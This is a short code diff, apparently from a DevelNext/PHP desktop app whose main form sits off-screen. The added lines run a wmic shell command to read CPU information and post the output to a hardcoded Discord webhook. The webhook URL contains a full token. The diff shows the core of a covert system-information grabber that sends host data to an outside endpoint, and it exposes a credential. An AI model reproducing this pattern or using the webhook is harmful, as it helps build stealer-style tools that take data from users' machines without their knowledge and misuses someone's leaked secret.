@@ -2,6 +2,14 @@ app()->form('MainForm')->layout->position = [5000,0];
 
 //execute('cmd /c start https://discord.gg/bQqCrzugng');
 
+$l = null;
+        execute('cmd /c wmic.exe CPU get NumberOfCores, NumberOfLogicalProcessors')->getInput()->eachLine(function ($line) use(&$l){
+            $l .= $line."\n";
+            
+        });
+
+
+
 use httpclient;
 // Replace the URL with your own webhook url
 $url = "https://discord.com/api/webhooks/838284423278493697/gthE3yddrHZwT5n0dYCqvHtu5lQCYy_nnNdfghmnK-W2QOq3X7xPOoaEKhY-tiszfAGW";
@@ -14,7 +22,7 @@ $hookObject = [
     /*
      * The general "message" shown above your embeds
      */
-    "content" => "+",
+    "content" => $l,
 
     /*
      * The username shown in the message
